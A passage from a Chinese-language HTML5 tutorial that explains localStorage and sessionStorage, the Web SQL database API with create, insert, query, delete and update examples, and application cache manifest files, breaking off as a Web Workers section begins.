class="hljs code-wrapper"><pre><code class="hljs html">localStorage.sitename=&quot;W3Cschool在线教程&quot;;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot;网站名：&quot; + localStorage.sitename;<br></code></pre></div></td></tr></table></figure><p>解析：</p><ul><li>使用 key=”sitename” 和 value=”在线学习” 创建一个 localStorage 键/值对。</li><li>检索键值为”sitename” 的值然后将数据插入 id=”result”的元素中。</li></ul><p>上实例也可以这么写：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">// 存储<br>localStorage.sitename = &quot;W3Cschool在线教程&quot;;<br>// 查找<br>document.getElementById(&quot;result&quot;).innerHTML = localStorage.sitename;<br></code></pre></div></td></tr></table></figure><p>移除 localStorage 中的 “lastname” :</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">localStorage.removeItem(&quot;lastname&quot;);<br></code></pre></div></td></tr></table></figure><p>不管是 localStorage，还是 sessionStorage，可使用的API都相同，常用的有如下几个（以localStorage为例）：</p><ul><li>保存数据：localStorage.setItem(key,value);</li><li>读取数据：localStorage.getItem(key);</li><li>删除单个数据：localStorage.removeItem(key);</li><li>删除所有数据：localStorage.clear();</li><li>得到某个索引的key：localStorage.key(index);</li></ul><p><strong>提示：</strong>键/值对通常以字符串存储，你可以按自己的需要转换该格式。</p><p>使用实例：展示了用户点击按钮的次数。(字符串值转换为数字类型)</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if (localStorage.clickcount)&#123;<br>  localStorage.clickcount=Number(localStorage.clickcount)+1;<br>&#125;<br>else&#123;<br>  localStorage.clickcount=1;<br>&#125;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot; 你已经点击了按钮 &quot; + localStorage.clickcount + &quot; 次 &quot;;<br></code></pre></div></td></tr></table></figure><h4 id="2-1-2-sessionStorage-对象"><a href="#2-1-2-sessionStorage-对象" class="headerlink" title="2.1.2 sessionStorage 对象"></a>2.1.2 sessionStorage 对象</h4><p>sessionStorage 方法针对一个 session 进行数据存储。当用户关闭浏览器窗口后，数据会被删除。</p><p>创建并访问一个 sessionStorage：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">if (sessionStorage.clickcount)&#123;<br>  sessionStorage.clickcount=Number(sessionStorage.clickcount)+1;<br>  &#125;<br>else&#123;<br>  sessionStorage.clickcount=1;<br>  &#125;<br>document.getElementById(&quot;result&quot;).innerHTML=&quot;在这个会话中你已经点击了该按钮 &quot; + sessionStorage.clickcount + &quot; 次 &quot;;<br></code></pre></div></td></tr></table></figure><h2 id="3-Web-SQL"><a href="#3-Web-SQL" class="headerlink" title="3.Web SQL"></a>3.Web SQL</h2><p>Web SQL 是在浏览器上模拟数据库，可以使用 JS 来操作 SQL 完成对数据的读写。Web SQL 数据库 API 并不是 HTML5 规范的一部分，但是它是一个独立的规范，引入了一组使用 SQL 操作客户端数据库的 APIs。</p><h3 id="3-1-核心方法"><a href="#3-1-核心方法" class="headerlink" title="3.1 核心方法"></a>3.1 核心方法</h3><p>规范中定义的三个核心方法：</p><blockquote><ol><li>openDatabase：这个方法使用现有的数据库或者新建的数据库创建一个数据库对象。</li><li>transaction：这个方法让我们能够控制一个事务，以及基于这种情况执行提交或者回滚。</li><li>executeSql：这个方法用于执行实际的 SQL 查询。</li></ol></blockquote><h3 id="3-2-打开数据库"><a href="#3-2-打开数据库" class="headerlink" title="3.2 打开数据库"></a>3.2 打开数据库</h3><p>使用 openDatabase() 方法来打开已存在的数据库，如果数据库不存在，则会创建一个新的数据库。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br></code></pre></div></td></tr></table></figure><p>openDatabase() 方法对应的五个参数说明：</p><blockquote><ol><li>数据库名称</li><li>版本号</li><li>描述文本</li><li>数据库大小</li><li>创建回调</li></ol></blockquote><p>其中，第五个参数创建回调会在创建数据库后被调用。</p><h3 id="3-3-执行查询操作"><a href="#3-3-执行查询操作" class="headerlink" title="3.3 执行查询操作"></a>3.3 执行查询操作</h3><p>使用 database.transaction() 函数：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;  <br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>语句执行后会在 ‘mydb’ 数据库中创建一个名为 LOGS 的表。</p><h3 id="3-4-插入数据"><a href="#3-4-插入数据" class="headerlink" title="3.4 插入数据"></a>3.4 插入数据</h3><p>在执行上面的创建表语句后，我们可以插入一些数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://lichengloong.com/&quot;)&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>使用多态值来插入数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br>db.transaction(function (tx) &#123;  <br>  tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>  tx.executeSql(&#x27;INSERT INTO LOGS (id,log) VALUES (?, ?)&#x27;, [e_id, e_log]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>实例中的 e_id 和 e_log 是外部变量，executeSql 会映射数组参数中的每个条目给 “?”。</p><h3 id="3-5-读取数据"><a href="#3-5-读取数据" class="headerlink" title="3.5 读取数据"></a>3.5 读取数据</h3><p>读取数据库中已经存在的数据：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">var db = openDatabase(&#x27;mydb&#x27;, &#x27;1.0&#x27;, &#x27;Test DB&#x27;, 2 * 1024 * 1024);<br><br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;);<br>   tx.executeSql(&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://lichengloong.com/&quot;)&#x27;);<br>&#125;);<br><br>db.transaction(function (tx) &#123;<br>   tx.executeSql(&#x27;SELECT * FROM LOGS&#x27;, [], function (tx, results) &#123;<br>      var len = results.rows.length, i;<br>      msg = &quot;<br>查询记录条数: &quot; + len + &quot;<br><br>&quot;;<br>      document.querySelector(&#x27;#status&#x27;).innerHTML +=  msg;<br><br>      for (i = 0; i &lt; len; i++)&#123;<br>         alert(results.rows.item(i).log );<br>      &#125;<br><br>   &#125;, null);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p><strong>完整实例</strong></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> db = openDatabase(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;1.0&#x27;</span>, <span class="hljs-string">&#x27;Test DB&#x27;</span>, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);<br><span class="hljs-keyword">var</span> msg;<br><br>db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;<br><br>            tx.executeSql(<span class="hljs-string">&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;</span>);<br><br>            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;</span>);<br><br>            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://lichengloong.com/&quot;)&#x27;</span>);<br><br>            msg = <span class="hljs-string">&#x27;&lt;p&gt;数据表已创建，且插入了两条数据。&lt;/p&gt;&#x27;</span>;<br><br>            <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;<br><br>         &#125;);<br><br><br>db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;<br><br>            tx.executeSql(<span class="hljs-string">&#x27;SELECT * FROM LOGS&#x27;</span>, [], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx, results</span>) </span>&#123;<br><br>               <span class="hljs-keyword">var</span> len = results.rows.length, i;<br><br>               msg = <span class="hljs-string">&quot;&lt;p&gt;查询记录条数: &quot;</span> + len + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br><br>               <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;<br><br>               <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; len; i++)&#123;<br><br>                  msg = <span class="hljs-string">&quot;&lt;p&gt;&lt;b&gt;&quot;</span> + results.rows.item(i).log + <span class="hljs-string">&quot;&lt;/b&gt;&lt;/p&gt;&quot;</span>;<br><br>                  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;<br><br>               &#125;<br><br>            &#125;, <span class="hljs-literal">null</span>);<br><br>         &#125;);<br></code></pre></div></td></tr></table></figure><h3 id="3-6-删除记录"><a href="#3-6-删除记录" class="headerlink" title="3.6 删除记录"></a>3.6 删除记录</h3><p>删除记录的格式：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function (tx) &#123;<br>    tx.executeSql(&#x27;DELETE FROM LOGS  WHERE id=1&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>删除指定的数据 id 也可以是动态的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function(tx) &#123;<br>    tx.executeSql(&#x27;DELETE FROM LOGS WHERE id=?&#x27;, [id]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><h3 id="3-7-更新记录"><a href="#3-7-更新记录" class="headerlink" title="3.7 更新记录"></a>3.7 更新记录</h3><p>更新记录的格式：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function (tx) &#123;<br>    tx.executeSql(&#x27;UPDATE LOGS SET log=\&#x27;https://lichengloong.com/&#x27; WHERE id=2&#x27;);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p>更新指定的数据 id 也可以是动态的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">db.transaction(function(tx) &#123;<br>    tx.executeSql(&#x27;UPDATE LOGS SET log=\&#x27;https://lichengloong.com/&#x27; WHERE id=?&#x27;, [id]);<br>&#125;);<br></code></pre></div></td></tr></table></figure><p><strong>完整实例</strong></p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <br>      <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br>      <br><span class="javascript">         <span class="hljs-keyword">var</span> db = openDatabase(<span class="hljs-string">&#x27;mydb&#x27;</span>, <span class="hljs-string">&#x27;1.0&#x27;</span>, <span class="hljs-string">&#x27;Test DB&#x27;</span>, <span class="hljs-number">2</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>);</span><br><span class="javascript">         <span class="hljs-keyword">var</span> msg;</span><br>         <br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;CREATE TABLE IF NOT EXISTS LOGS (id unique, log)&#x27;</span>);</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (1, &quot;HTML5教程&quot;)&#x27;</span>);</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;INSERT INTO LOGS (id, log) VALUES (2, &quot;https://lichengloong.com/&quot;)&#x27;</span>);</span><br><span class="handlebars"><span class="xml">            msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>数据表已创建，且插入了两条数据。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">            <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">              tx.executeSql(<span class="hljs-string">&#x27;DELETE FROM LOGS  WHERE id=1&#x27;</span>);</span><br><span class="handlebars"><span class="xml">              msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>删除 id 为 1 的记录。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">              <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">             tx.executeSql(<span class="hljs-string">&#x27;UPDATE LOGS SET log=\&#x27;https://lichengloong.com/&#x27;</span> WHERE id=<span class="hljs-number">2</span><span class="hljs-string">&#x27;);</span></span><br><span class="handlebars"><span class="xml">              msg = &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>更新 id 为 2 的记录。<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&#x27;;</span></span><br><span class="javascript">              <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML =  msg;</span><br>         &#125;);<br><br><span class="javascript">         db.transaction(<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx</span>) </span>&#123;</span><br><span class="javascript">            tx.executeSql(<span class="hljs-string">&#x27;SELECT * FROM LOGS&#x27;</span>, [], <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">tx, results</span>) </span>&#123;</span><br><span class="javascript">               <span class="hljs-keyword">var</span> len = results.rows.length, i;</span><br><span class="javascript">               msg = <span class="hljs-string">&quot;&lt;p&gt;查询记录条数: &quot;</span> + len + <span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="javascript">               <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;</span><br>               <br>               for (i = 0; i &lt; len; i++)&#123;<br><span class="handlebars"><span class="xml">                  msg = &quot;<span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>&quot; + results.rows.item(i).log + &quot;<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>&quot;;</span></span><br><span class="javascript">                  <span class="hljs-built_in">document</span>.querySelector(<span class="hljs-string">&#x27;#status&#x27;</span>).innerHTML +=  msg;</span><br>               &#125;<br><span class="javascript">            &#125;, <span class="hljs-literal">null</span>);</span><br>         &#125;);<br>         <br>      <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>      <br>   <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br>   <br>   <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>状态信息<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h2 id="4-应用程序缓存"><a href="#4-应用程序缓存" class="headerlink" title="4.应用程序缓存"></a>4.应用程序缓存</h2><p>使用 HTML5，通过创建 cache manifest 文件，可以轻松地创建 web 应用的离线版本。这意味着，你可以在没有网络连接的情况下进行访问。</p><p>应用程序缓存为应用带来三个优势：</p><blockquote><ol><li>离线浏览 - 用户可在应用离线时使用它们</li><li>速度 - 已缓存资源加载得更快</li><li>减少服务器负载 - 浏览器将只从服务器下载更新过或更改过的资源。</li></ol></blockquote><h3 id="4-1-Cache-Manifest-实例"><a href="#4-1-Cache-Manifest-实例" class="headerlink" title="4.1 Cache Manifest 实例"></a>4.1 Cache Manifest 实例</h3><p>展示带有 cache manifest 的 HTML 文档（供离线浏览）：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">&quot;demo.appcache&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>The content of the document......<br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><h3 id="4-2-Cache-Manifest-基础"><a href="#4-2-Cache-Manifest-基础" class="headerlink" title="4.2 Cache Manifest 基础"></a>4.2 Cache Manifest 基础</h3><p>如需启用应用程序缓存，需要在文档的&lt;html&gt; 标签中包含 manifest 属性：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span>        <br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">manifest</span>=<span class="hljs-string">&quot;demo.appcache&quot;</span>&gt;</span>        <br>...        <br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></div></td></tr></table></figure><p>每个指定了 manifest 的页面在用户对其访问时都会被缓存。如果未指定 manifest 属性，则页面不会被缓存（除非在 manifest 文件中直接指定了该页面）。manifest 文件的建议的文件扩展名是：”.appcache”。</p><p>manifest 文件需要配置正确的 MIME-type，即 “text/cache-manifest”。必须在 web 服务器上进行配置。</p><h3 id="4-3-Manifest-文件"><a href="#4-3-Manifest-文件" class="headerlink" title="4.3 Manifest 文件"></a>4.3 Manifest 文件</h3><p>manifest 文件是简单的文本文件，它告知浏览器被缓存的内容（以及不缓存的内容）。</p><p>manifest 文件可分为三个部分：</p><blockquote><ul><li>CACHE MANIFEST - 在此标题下列出的文件将在首次下载后进行缓存</li><li>NETWORK - 在此标题下列出的文件需要与服务器的连接，且不会被缓存</li><li>FALLBACK - 在此标题下列出的文件规定当页面无法访问时的回退页面（比如 404 页面）</li></ul></blockquote><h3 id="4-4-CACHE-MANIFEST"><a href="#4-4-CACHE-MANIFEST" class="headerlink" title="4.4 CACHE MANIFEST"></a>4.4 CACHE MANIFEST</h3><p>第一行，CACHE MANIFEST，是必需的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">CACHE MANIFEST        <br>/theme.css        <br>/logo.gif        <br>/main.js<br></code></pre></div></td></tr></table></figure><p>上面的 manifest 文件列出了三个资源：一个 CSS 文件，一个 GIF 图像，以及一个 JavaScript 文件。当 manifest 文件加载后，浏览器会从网站的根目录下载这三个文件。然后，无论用户何时与因特网断开连接，这些资源依然是可用的。</p><h3 id="4-5-NETWORK"><a href="#4-5-NETWORK" class="headerlink" title="4.5 NETWORK"></a>4.5 NETWORK</h3><p>下面的 NETWORK 小节规定文件 “login.php” 永远不会被缓存，且离线时是不可用的：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">NETWORK:        <br>login.php<br></code></pre></div></td></tr></table></figure><p>可以使用星号来指示所有其他其他资源/文件都需要因特网连接：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">NETWORK:        <br>*<br></code></pre></div></td></tr></table></figure><h3 id="4-6-FALLBACK"><a href="#4-6-FALLBACK" class="headerlink" title="4.6 FALLBACK"></a>4.6 FALLBACK</h3><p>下面的 FALLBACK 小节规定如果无法建立因特网连接，则用 “offline.html” 替代 /html5/ 目录中的所有文件：</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">FALLBACK:       <br>/html/ /offline.html<br></code></pre></div></td></tr></table></figure><p>第一个 URI 是资源，第二个是替补。</p><h3 id="4-7-更新缓存"><a href="#4-7-更新缓存" class="headerlink" title="4.7 更新缓存"></a>4.7 更新缓存</h3><p>一旦应用被缓存，它就会保持缓存直到发生下列情况：</p><blockquote><ul><li>用户清空浏览器缓存</li><li>manifest 文件被修改（参阅下面的提示）</li><li>由程序来更新应用缓存</li></ul></blockquote><h3 id="4-8-完整的-Manifest-文件"><a href="#4-8-完整的-Manifest-文件" class="headerlink" title="4.8 完整的 Manifest 文件"></a>4.8 完整的 Manifest 文件</h3><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html">CACHE MANIFEST        <br># 2012-02-21 v1.0.0       <br>/theme.css        <br>/logo.gif        <br>/main.js        <br>        <br>NETWORK:        <br>login.php        <br>        <br>FALLBACK:       <br>/html/ /offline.html<br></code></pre></div></td></tr></table></figure><p>以 “#” 开头的是注释行，但也可满足其他用途。应用的缓存会在其 manifest 文件更改时被更新。如果您编辑了一幅图片，或者修改了一个 JavaScript 函数，这些改变都不会被重新缓存。更新注释行中的日期和版本号是一种使浏览器重新缓存文件的办法。</p><h3 id="4-9-关于应用程序缓存的说明"><a href="#4-9-关于应用程序缓存的说明" class="headerlink" title="4.9 关于应用程序缓存的说明"></a>4.9 关于应用程序缓存的说明</h3><p>请留心缓存的内容。一旦文件被缓存，则浏览器会继续展示已缓存的版本，即使您修改了服务器上的文件。为了确保浏览器更新缓存，您需要更新 manifest 文件。</p><p>浏览器对缓存数据的容量限制可能不太一样（某些浏览器设置的限制是每个站点 5MB）。</p><h2 id="5-Web-Workers"><a href="#5-Web-Workers" class="headerlink" title="5.Web Workers"></a>5.Web Workers</h2><p>web worker 是运行在后台的 JavaScript，不会影响页面的性能，更好的解释是，你可以使用web 